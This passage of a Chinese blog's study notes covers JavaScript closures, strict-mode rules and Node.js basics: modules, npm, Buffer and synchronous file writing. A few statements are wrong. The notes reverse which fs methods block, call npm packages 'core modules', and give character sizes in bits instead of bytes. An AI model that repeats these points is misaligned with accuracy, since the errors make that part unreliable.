title="闭包的高级用法"></a>闭包的高级用法</h2><ul><li>闭包与匿名函数结合使用<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> funOne = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        num++;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">funOne</span>());      <span class="comment">// 输出：1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">funOne</span>());      <span class="comment">// 输出：2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">funOne</span>());      <span class="comment">// 输出：3</span></span><br></pre></td></tr></table></figure></li><li>同一个闭包机制可以创建多个闭包函数出来，它们彼此没有联系，都是独立的<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">funOne</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">funTwo</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;数字：&#x27;</span> + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> funTwo;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> fa = <span class="title function_">funOne</span>(<span class="number">110</span>);</span><br><span class="line"><span class="keyword">var</span> fb = <span class="title function_">funOne</span>(<span class="number">111</span>);</span><br><span class="line"><span class="keyword">var</span> fc = <span class="title function_">funOne</span>(<span class="number">112</span>);</span><br><span class="line"><span class="title function_">fa</span>();       <span class="comment">// 输出：数字：110</span></span><br><span class="line"><span class="title function_">fb</span>();       <span class="comment">// 输出：数字：111</span></span><br><span class="line"><span class="title function_">fc</span>();       <span class="comment">// 输出：数字：112</span></span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h1><h2 id="启用严格模式"><a href="#启用严格模式" class="headerlink" title="启用严格模式"></a>启用严格模式</h2><ul><li>将<code>&quot;use strict&quot;;</code>指令添加到 JavaScript 程序的第一行，则表示整个脚本都会处于严格模式。如果在函数的第一行代码中添加<code>&quot;use strict&quot;;</code>，则表示只在该函数中启用严格模式</li><li>注意：<code>&quot;use strict&quot;;</code>或<code>&#39;use strict&#39;;</code>指令只有在<code>整个脚本第一行</code>或者<code>函数第一行</code>时才能被识别</li></ul><h2 id="严格模式中的变化"><a href="#严格模式中的变化" class="headerlink" title="严格模式中的变化"></a>严格模式中的变化</h2><ul><li>不允许使用未声明的变量<ul><li>普通模式下，如果一个变量还没有声明，就直接拿来赋值，JavaScript 解释器会自动为您创建这个变量。而在严格模式下，则不允许这么做，所有变量在使用前必须显式的声明，否则将会抛出一个 ReferenceError 错误。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line">v = <span class="number">1</span>;        <span class="comment">// 此处报错：Uncaught ReferenceError: v is not defined</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123; <span class="comment">// 此处报错：Uncaught ReferenceError: i is not defined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li>不允许删除变量或函数<ul><li>在严格模式下，如果您尝试删除一个变量或函数，则会抛出语法错误。而在普通模式下，虽然不会成功，但并不报错。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> person = &#123;<span class="attr">name</span>: <span class="string">&quot;Peter&quot;</span>, <span class="attr">age</span>: <span class="number">28</span>&#125;;</span><br><span class="line"><span class="keyword">delete</span> person;  <span class="comment">// 此处报错：Uncaught SyntaxError: Delete of an unqualified identifier in strict mode.</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span> sum;  <span class="comment">// 此处报错：Uncaught SyntaxError: Delete of an unqualified identifier in strict mode.</span></span><br></pre></td></tr></table></figure></li></ul></li><li>函数中不允许有同名的参数<ul><li>在严格模式下，如果函数中有两个或多个同名参数，则会抛出语法错误，而在普通模式下则不会。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">square</span>(<span class="params">a, a</span>) &#123;     <span class="comment">// 此处报错：Uncaught SyntaxError: Duplicate parameter name not allowed in this context</span></span><br><span class="line">    <span class="keyword">return</span> a * a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li>eval 语句的作用域是独立的<ul><li>普通模式下，eval 语句的作用域取决于它所在的位置，而在严格模式下，eval 语句本身就是一个局部作用域，通过 eval 语句生成的变量只能在 eval 语句内使用。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;var x = 5; console.log(x);&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x);     <span class="comment">// 此处报错：Uncaught ReferenceError: x is not defined</span></span><br></pre></td></tr></table></figure></li></ul></li><li>不允许使用 with 语句<ul><li>在严格模式下，不允许使用 with 语句<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> radius1 = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> area1 = <span class="title class_">Math</span>.<span class="property">PI</span> * radius1 * radius1;</span><br><span class="line"><span class="keyword">var</span> radius2 = <span class="number">5</span>;</span><br><span class="line"><span class="title function_">with</span>(<span class="params"><span class="built_in">Math</span></span>) &#123;        <span class="comment">// 此处报错：Uncaught SyntaxError: Strict mode code may not include a with statement</span></span><br><span class="line">    <span class="keyword">var</span> area2 = <span class="variable constant_">PI</span> * radius2 * radius2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li>不允许写入只读属性<ul><li>在严格模式下，不允许为只读或不存在的属性赋值，否则会造成语法错误，而在普通模式下，虽然不会成功，但并不会报错。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> person = &#123;<span class="attr">name</span>: <span class="string">&quot;Peter&quot;</span>, <span class="attr">age</span>: <span class="number">28</span>&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&quot;gender&quot;</span>, &#123;<span class="attr">value</span>: <span class="string">&quot;male&quot;</span>, <span class="attr">writable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">person.<span class="property">gender</span> = <span class="string">&quot;female&quot;</span>; <span class="comment">// 此处报错：Uncaught TypeError: Cannot assign to read only property &#x27;gender&#x27; of object &#x27;#&lt;Object&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul></li><li>不允许使用八进制数<ul><li>在严格模式下，不允许使用八进制数（以零为前缀的数字，例如 010、0377），而在普通模式下则可以。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> x = <span class="number">010</span>; <span class="comment">// 此处报错：Uncaught SyntaxError: Octal literals are not allowed in strict mode.</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseInt</span>(x));</span><br></pre></td></tr></table></figure></li></ul></li><li>不能在 if 语句中声明函数<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="comment">//如果在if语句中声明函数，则会产生语法错误</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">demo</span>(<span class="params"></span>) &#123; <span class="comment">// 此处报错：Uncaught ReferenceError: demo is not defined</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;http://c.biancheng.net/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">demo</span>();</span><br></pre></td></tr></table></figure></li><li>禁止使用 this 表示全局对象<ul><li>在普通模式下，this 关键字表示全局对象 window，而在严格模式下，this关键字则表示 undefined。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;http://c.biancheng.net/&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">demoTest</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">demoTest</span>();</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs基础</title>
      <link href="/2022/03/14/node/"/>
      <url>/2022/03/14/node/</url>
      
        <content type="html"><![CDATA[<h1 id="node简介"><a href="#node简介" class="headerlink" title="node简介"></a>node简介</h1><p><strong>Node.js 在浏览器之外运行 V8 JavaScript 引擎（Google Chrome 的内核）。 这使得 Node.js 的性能非常好。<br>Node.js 应用程序在单个进程中运行，无需为每个请求创建新的线程。 Node.js 在其标准库中提供了一组异步的 I/O 原语，以防止 JavaScript 代码阻塞，通常，Node.js 中的库是使用非阻塞范式编写的，使得阻塞行为成为异常而不是常态。</strong></p><ul><li>node是一款对ES标准实现的JS引擎</li><li>js是在浏览器运行，浏览器是在客户端运行</li><li>通过node可以使js在服务器中运行，和window等系统进行交互，node就是一款使用js编写的web服务器</li><li>Node可以在后台来编写服务器<ul><li>Node编写服务器都是单线程的服务器</li></ul></li><li>Node仅仅对ES标准进行了实现，所以在Node中不包含DOM 和 BOM</li><li>Node中可以使用所有的内建对象<br>String Number Boolean Math Date RegExp Function Object Array<br>而BOM和DOM都不能使用<br>但是可以使用 console 也可以使用定时器（setTimeout() setInterval()）</li><li>传统的服务器都是多线程的<ul><li>每进来一个请求，就创建一个线程去处理请求</li></ul></li><li>Node的服务器单线程的<ul><li>Node处理请求时是单线程，但是在后台拥有一个I/O线程池</li></ul></li><li>node底层是使用c++的编写的</li><li>node的中js引擎使用的chrome的v8引擎</li><li>node的特点：<br>1.非阻塞、异步的I/O<br>2.事件和回调函数<br>3.单线程（主线程单线程，后台I/O线程池）<br>4.跨平台</li></ul><hr><h1 id="node命令行窗口"><a href="#node命令行窗口" class="headerlink" title="node命令行窗口"></a>node命令行窗口</h1><ul><li><strong>常用指令</strong><ul><li>dir 表示列出当前目录下的所有文件</li><li>cd 目录名 表示进入到指定的目录</li><li>md 目录名 表示创建一个文件夹</li><li>rm 目录名 表示删除一个文件夹</li></ul></li><li><strong>目录</strong><ul><li>. 表示当前目录</li><li>.. 表示上一级目录</li></ul></li><li><strong>环境变量（window系统中的变量）</strong><ul><li>path 环境变量中保存的是一个一个的路径，路径之间用;隔开<br>C:\work\jdk\jdk1.7.0_75/bin;<br>%CATALINA_HOME%/bin;<br>C:\work\soft\tools\AppServ\Apache24\bin;<br>C:\work\soft\tools\AppServ\php5;<br>C:\Users\lilichao\AppData\Local\Programs\Fiddler;<br>C:\work\environment\Egret\Egret Wing 3\bin;<br>C:\Users\lilichao\AppData\Roaming\npm;<br>C:\Program Files\MongoDB\Server\3.2\bin;<br>C:\Users\lilichao\Desktop\hello</li><li>作用<ul><li>当在命令行窗口打开一个文件或调用一个程序时，系统会首先在当前目录下寻找文件程序， 如果找到了则直接打开；如果没找到则会到环境变量path的路径中寻找；如果没找到则报错（作用域链）</li><li>所以可以将一些经常需要访问的程序和文件路径添加到path中，这样就可以在任意位置来访问这些文件和程序了</li></ul></li></ul></li></ul><hr><h1 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h1><ul><li>进程 <ul><li>进程负责为程序的运行提供必备的环境</li><li>进程就是一个一个的工作计划（工厂中的车间）</li></ul></li><li>线程<ul><li>线程是计算机最小的运算单位，负责执行进程中的程序（工厂中的工人）<br>线程是干活的</li><li>单线程：进程只有一个线程（一个人干），js是单线程的，浏览器（js）是单线程的</li><li>多线程：一个程序中可以同时运行多个线程来执行（多个人干一个活），存在并发的问题</li></ul></li></ul><hr><h1 id="I-O-Input-Output"><a href="#I-O-Input-Output" class="headerlink" title="I/O (Input/Output)"></a>I/O (Input/Output)</h1><ul><li>I/O操作指的是对磁盘的读写操作</li><li>客户端发送请求与网速有关，服务器响应请求与带宽有关，I/O的操作（另一个线程）阻塞了客户端请求线程，<br>客户端请求线程只能等待，导致速度慢；可以减少客户端请求线程<br><img src="/images/%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B.jpg" alt="Image text"></li></ul><hr><h1 id="node执行js文件"><a href="#node执行js文件" class="headerlink" title="node执行js文件"></a>node执行js文件</h1><ul><li>将代码写在js文件中，打开命令行窗口，进入到js文件所在的目录，然后执行：node js文件名</li></ul><hr><h1 id="模块化简介"><a href="#模块化简介" class="headerlink" title="模块化简介"></a>模块化简介</h1><ul><li>降低代码的耦合性和可以复用代码</li><li>ES5中没有原生支持模块化，我们只能通过script标签引入js文件来实现模块化</li><li>在node中为了对模块管理，引入了CommonJS规范<ul><li>模块的引用<ul><li>使用 require()函数来引入一个模块<ul><li>例子：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 变量 = <span class="built_in">require</span>(<span class="string">&quot;模块的标识&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>模块的定义<ul><li>在node中一个js文件就是一个模块</li><li>在模块中存在一杯module对象，代表模块自身，exports是module的属性<ul><li>exports和module.exports<ul><li>通过exports只能使用.的方式来向外暴露内部变量</li><li>而module.exports既可以通过.的形式，也可以直接赋值</li></ul></li></ul></li><li>默认情况下在js文件中编写的内容，都是运行在一个独立的函数中(立即调用函数)，而不是全局作用域，所以一个模块中的变量和函数在其他模块无法访问</li><li>导出变量和函数<ul><li>使用 exports （向外部暴露属性或方法）<ul><li>例子：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exports</span>.属性 = 属性值;</span><br><span class="line"><span class="built_in">exports</span>.方法 = 函数;</span><br></pre></td></tr></table></figure></li></ul></li><li>使用module.exports<ul><li>例子：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// exports指向module.exports</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.属性 = 属性值;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.方法 = 函数;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;孙悟空&#x27;</span>,</span><br><span class="line">  <span class="attr">sayName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;孙悟空&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// 修改对象，该方式导出数据成功</span></span><br><span class="line"><span class="built_in">exports</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;孙悟空&#x27;</span>,</span><br><span class="line">  <span class="attr">sayName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;孙悟空&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// 修改变量,因此该方式导出数据不成功</span></span><br></pre></td></tr></table></figure></li></ul></li><li>模块的标识<ul><li>模块的标识就是模块的名字或路径<ul><li>node通过模块的标识来寻找模块的 <ul><li>对于<strong>核心模块</strong>（npm中下载的模块），直接使用模块的名字对其进行引入<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>对于自定义的<strong>文件模块</strong>，需要通过文件的路径来对模块进行引入，路径可以是绝对路径，如果是相对路径必须以./或 ../开头<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> router = <span class="built_in">require</span>(<span class="string">&quot;./router&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><hr><h1 id="判断js文件中的内容是否是全局变量"><a href="#判断js文件中的内容是否是全局变量" class="headerlink" title="判断js文件中的内容是否是全局变量"></a>判断js文件中的内容是否是全局变量</h1><ul><li>在node中有一个全局对象global，作用和网页中window类似，在全局中创建的变量/函数会作为global的属性/函数保存<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>; <span class="comment">// 不是全局变量，</span></span><br><span class="line">b = <span class="number">2</span>; <span class="comment">// 全局变量</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">global</span>.<span class="property">a</span>) <span class="comment">// undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">global</span>.<span class="property">b</span>) <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>) <span class="comment">// 封装函数中的实参，arguments（类数组）只有函数中有</span></span><br></pre></td></tr></table></figure></li><li>js文件包裹的函数<ul><li>实际上模块中的代码都是包装在一个函数中执行的，并且在函数执行时，同时传递进了5个实参<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当node在执行模块中的代码时，它会首先在代码的最顶部，添加如下代码</span></span><br><span class="line"><span class="keyword">function</span>(<span class="params"><span class="built_in">exports</span>, <span class="built_in">require</span>, <span class="variable language_">module</span>, __filename, __dirname</span>) &#123;</span><br><span class="line">  <span class="comment">// 在代码的最底部，添加如下代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>exports<ul><li>该对象用来将变量或函数暴露到外部</li></ul></li><li>require<ul><li>函数，用来引入外部的模块</li></ul></li><li>module<ul><li>module代表的是当前模块本身</li><li>exports就是module的属性</li><li>既可以使用 exports 导出，也可以使用module.exports导出</li></ul></li><li>__filename<ul><li>当前模块的完整路径（C:\Users\lilichao\WebstormProjects\class0705\01.node\04.module.js）</li></ul></li><li>__dirname<ul><li>当前模块所在文件夹的完整路径（C:\Users\lilichao\WebstormProjects\class0705\01.node）</li></ul></li></ul></li></ul></li></ul><hr><h1 id="包-package简介"><a href="#包-package简介" class="headerlink" title="包 package简介"></a>包 package简介</h1><ul><li>将多个模块组合为一个完整的功能，就是一个包</li><li>包结构<ul><li>bin：二进制的可执行文件，一般都是一些工具包中才有</li><li>lib：js文件</li><li>doc：文档</li><li>test：测试代码</li><li><code>package.json：包的描述文件</code></li><li>package.json    <ul><li>它是一个json格式的文件，位于包的根目录下，里面保存了包各种相关的信息，json文件不能写注释<br>  name 包名<br>  version 版本<br>  dependencies 依赖<br>  main 包的主要的文件<br>  bin 可执行文件<br>  scripts 命令</li></ul></li></ul></li></ul><hr><h1 id="npm简介（Node-Package-Manager）"><a href="#npm简介（Node-Package-Manager）" class="headerlink" title="npm简介（Node Package Manager）"></a>npm简介（Node Package Manager）</h1><ul><li>npm完成第三方模块的发布、安装和依赖（安装a，发现使用a依赖哪些包，会自动全部下载）等，安装完node自带npm</li><li>npm命令<ul><li>npm -v <ul><li>查看npm的版本</li></ul></li><li>npm init<ul><li>初始化安装package.json</li></ul></li><li>npm version <ul><li>查看所有模块的版本</li></ul></li><li>npm search 包名 <ul><li>搜索包</li></ul></li><li>npm install / i 包名 <ul><li>安装包</li></ul></li><li>npm remove / r 包名 <ul><li>删除包</li></ul></li><li><code>npm install 包名 --save</code><ul><li>安装包并添加到依赖中</li></ul></li><li>npm install <ul><li>下载当前项目所依赖的包</li></ul></li><li>npm install 包名 -g <ul><li>全局安装包（全局安装的包一般都是一些工具,一般不是在项目中使用的，而是在计算机中使用的，编译css文件，给项目打包的）</li></ul></li><li>npm install 包名 –registry=地址<ul><li>从镜像源安装</li></ul></li><li>npm config set registry=地址<ul><li>设置镜像源</li></ul></li></ul></li><li>配置cnpm<ul><li>镜像服务器</li><li>直接安装cnpm，安装淘宝提供的cnpm，并更改服务器地址为淘宝的国内地址，命令：npm install -g cnpm –registry=<a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a></li><li>node搜索包的流程<ul><li>npm下载的包都放到node_modules文件夹中，通过npm下载的包，直接用包名引入</li><li>node在使用模块名字引入模块时，首先在当前目录的node_modules中寻找是否含有该模块，如果有则直接使用，如果没有则去上一级目录的node_modules中寻找，以此类推，直到找到为止，直到找到磁盘的根目录，如果依然没有，则报错（跟作用域一样）</li></ul></li></ul></li></ul><hr><h1 id="Buffer-缓冲区"><a href="#Buffer-缓冲区" class="headerlink" title="Buffer(缓冲区)"></a>Buffer(缓冲区)</h1><ul><li><p>Buffer的结构和数组很像，操作的方法也和数组类似</p></li><li><p>数组中不能存储二进制的文件，而buffer就是专门用来存储二进制数据</p></li><li><p>使用buffer不需要引入模块，直接使用即可</p></li><li><p>在buffer中存储的都是二进制数据，但是在在计算机中显示时都是以16进制的形式</p><ul><li><p>buffer中每一个元素的范围是从00 - ff   0 - 255<br>  00000000 - 11111111<br>  计算机 一个0 或一个1 我们称为1位（bit）</p><p>  8bit = 1byte（字节）// 传输数据中最小的单位是1个字节<br>  1024byte = 1kb<br>  1024kb = 1mb<br>  1024mb = 1gb<br>  1024gb = 1tb</p></li><li><p>buffer中的一个元素，占用内存的一个字节</p></li></ul></li><li><p>Buffer的大小一旦确定，则不能修改，Buffer实际上是对底层内存的直接操作</p></li><li><p>Buffer的方法</p><ul><li>Buffer.from(字符串)<ul><li>将一个字符串中内容保存到一个buffer中<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello 尚硅谷&quot;</span>;</span><br><span class="line"><span class="comment">//将一个字符串保存到buffer中</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(buf.length); //占用内存的大小，在内存中的字节数，1个汉字 = 3bit，1个字母=1bit</span></span><br><span class="line"><span class="comment">//console.log(str.length);//字符串的长度</span></span><br><span class="line"><span class="comment">//console.log(buf);</span></span><br></pre></td></tr></table></figure></li></ul></li><li>buf.toString()<ul><li>将buffer转换为一个字符串，将缓冲区中的数据转换为字符串<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf4 = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;我是一段文本数据&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf4.<span class="title function_">toString</span>()); <span class="comment">// 我是一段文本数据</span></span><br></pre></td></tr></table></figure></li></ul></li><li>Buffer.alloc(size)<ul><li>创建一个指定大小的buffer对象，创建并且清空<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个指定大小的buffer</span></span><br><span class="line"><span class="comment">//buffer构造函数都是不推荐使用的</span></span><br><span class="line"><span class="comment">//var buf2 = new Buffer(10);//10个字节的buffer</span></span><br><span class="line"><span class="comment">//console.log(buf2.length);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个10个字节的buffer</span></span><br><span class="line"><span class="keyword">var</span> buf2 = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">10</span>); <span class="comment">// &lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;</span></span><br><span class="line"><span class="comment">//通过索引，来操作buf中的元素</span></span><br><span class="line">buf2[<span class="number">0</span>] = <span class="number">88</span>; <span class="comment">// 十进制，58</span></span><br><span class="line">buf2[<span class="number">1</span>] = <span class="number">255</span>;</span><br><span class="line">buf2[<span class="number">2</span>] = <span class="number">0xaa</span>; <span class="comment">// 十六进制（0x），aa</span></span><br><span class="line">buf2[<span class="number">3</span>] = <span class="number">255</span>;</span><br><span class="line">buf2[<span class="number">10</span>] = <span class="number">15</span>; <span class="comment">// 无效，超出长度</span></span><br><span class="line">     </span><br><span class="line"><span class="comment">//只要数字在控制台或页面中输出一定是十进制</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf2[<span class="number">2</span>]); <span class="comment">// 170 十进制</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf2[<span class="number">2</span>].<span class="title function_">toString</span>(<span class="number">16</span>)); <span class="comment">// aa 十六进制</span></span><br><span class="line">     </span><br><span class="line"><span class="comment">/*for(var i=0 ; i&lt;buf2.length ; i++)&#123;</span></span><br><span class="line"><span class="comment">  console.log(buf2[i]);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure></li></ul></li><li>Buffer.allocUnsafe(size)<ul><li>创建一个指定大小的buffer对象，可以包含敏感数据，性能好<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Buffer.allocUnsafe(size) 创建一个指定大小的buffer，但是buffer中可能含有敏感数据，分配空间但不清空，可能会保存上次的保存信息</span></span><br><span class="line"><span class="keyword">var</span> buf3 = <span class="title class_">Buffer</span>.<span class="title function_">allocUnsafe</span>(<span class="number">10</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf3); <span class="comment">// &lt;Buffer 18 1e 4a 00 00 00 00 00 90 3c&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><hr><h1 id="文件系统（File-System）"><a href="#文件系统（File-System）" class="headerlink" title="文件系统（File System）"></a>文件系统（File System）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>文件系统简单来说就是通过Node来操作系统中的文件</li><li>使用文件系统，需要先引入fs模块，fs是核心模块，直接引入不需要下载</li><li>在Node通过fs模块来对系统中的文件进行操作，fs模块是node中已经继承好了，不需要在使用npm下载，直接引入即可<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入fs</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li>fs模块中的大部分操作都提供了两种方法，同步方法和异步方法<ul><li>同步方法带sync：不会阻塞程序执行，在操作完成时，通过回调函数将结果返回，直接return返回</li><li>异步方法没有sync，都需要回调函数：阻塞程序执行，除非操作执行完，否则不会向下执行代码</li></ul></li></ul><h2 id="同步文件的写入"><a href="#同步文件的写入" class="headerlink" title="同步文件的写入"></a>同步文件的写入</h2><ul><li><p>（隐患：运行出错，整个程序停止，同步处理异常很麻烦）</p></li><li><p>1、打开文件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//打开文件</span></span><br><span class="line"><span class="keyword">var</span> fd = fs.<span class="title function_">openSync</span>(<span class="string">&quot;hello.txt&quot;</span> , <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fd)</span><br></pre></td></tr></table></figure><ul><li><p>fs.openSync(path, flags[, mode])</p><ul><li>path 要打开文件的路径</li><li>flags 打开文件要做的操作的类型<ul><li>r 只读的</li><li>w 可写的</li></ul></li><li>mode 设置文件的操作权限，一般不传</li><li>返回值：该方法会返回一个文件的描述符作为结果，我们可以通过该描述符来对文件进行各种操作</li></ul></li><li><p>2、向文件中写入内容</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向文件中写入内容</span></span><br><span class="line">fs.<span class="title function_">writeSync</span>(fd , <span class="string">&quot;今天天气真不错~~~&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><ul><li>fs.writeSync(fd, string[, position[, encoding]])<ul><li>fd 文件的描述符，需要传递要写入的文件的描述符</li><li>string 要写入的内容</li><li>position 写入的起始位置</li><li>encoding 写入的编码，默认utf-8</li></ul></li></ul></li><li><p>3、保存并关闭文件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line">fs.<span class="title function_">closeSync</span>(fd);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;程序向下执行~~~&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>fs.closeSync(fd)<ul><li>fd 要关闭的文件的描述符</li></ul></li></ul></li></ul></li></ul><h2 id="异步文件的写入"><a href="#异步文件的写入" class="headerlink" title="异步文件的写入"></a>异步文件的写入</h2><p>-（运行出错，只是该部分出错；代码更加严谨）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//打开文件，异步没有返回值，只要有返回值就是同步的</span></span><br><span class="line">fs.<span class="title function_">open</span>(<span 